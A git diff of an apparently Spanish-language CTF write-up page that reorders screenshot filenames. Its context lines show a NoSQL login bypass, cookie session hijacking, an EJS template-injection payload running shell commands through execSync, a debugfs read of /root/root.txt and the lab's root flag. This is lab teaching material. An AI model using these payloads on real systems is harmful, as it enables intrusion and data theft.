@@ -86,7 +86,7 @@
 /logout (Status: 302) [--> /]
 /staff  (Status: 403) [Size: 1547]</code></pre>
   <figure>
-    <img src="img/poolside_1.webp" alt="Petición curl con bypass NoSQL y respuesta del servidor">
+    <img src="img/poolside_7.webp" alt="Petición curl con bypass NoSQL y respuesta del servidor">
     <figcaption>Respuesta HTTP 200 con el bypass de login.</figcaption>
   </figure>
 
@@ -113,7 +113,7 @@
   como esa sesión por el servidor. Se inyecta manualmente en el navegador (DevTools → Storage → Cookies) o se
   adjunta en peticiones con <code>curl -b</code>.</p>
   <figure>
-    <img src="img/poolside_2.webp" alt="Cookie connect.sid añadida manualmente en DevTools">
+    <img src="img/poolside_6.webp" alt="Cookie connect.sid añadida manualmente en DevTools">
     <figcaption>Cookie robada añadida en Storage → Cookies, asociada al dominio objetivo.</figcaption>
   </figure>
   <p>Recargando <code>/staff</code> con esa cookie activa, el servidor la reconoce como una sesión válida de
@@ -162,7 +162,7 @@
   cuando el atacante ya tiene RCE en la misma máquina.</p>
   <pre><code>&lt;%= process.mainModule.require('child_process').execSync('curl -s http://127.0.0.1:9229/json/list').toString() %&gt;</code></pre>
   <figure>
-    <img src="img/poolside_6.webp" alt="JSON del inspector mostrando processor.js y su webSocketDebuggerUrl">
+    <img src="img/poolside_2.webp" alt="JSON del inspector mostrando processor.js y su webSocketDebuggerUrl">
     <figcaption>El inspector revela el proceso processor.js y su webSocketDebuggerUrl.</figcaption>
   </figure>
   <p>El JSON devuelto incluye un <code>webSocketDebuggerUrl</code>, la dirección a la que conectarse por
@@ -200,7 +200,7 @@ echo cat /root/root.txt | debugfs /dev/nvme0n1p1
 &gt; debugfs: cat /root/root.txt
 &gt; THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></pre>
   <figure>
-    <img src="img/poolside_7.webp" alt="Root flag extraída vía debugfs en el preview de la plantilla EJS">
+    <img src="img/poolside_1.webp" alt="Root flag extraída vía debugfs en el preview de la plantilla EJS">
     <figcaption>Root flag extraída vía debugfs, sin haber obtenido nunca una shell de root.</figcaption>
   </figure>
   <p class="respuesta"><b>Root flag:</b> <code>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></p>
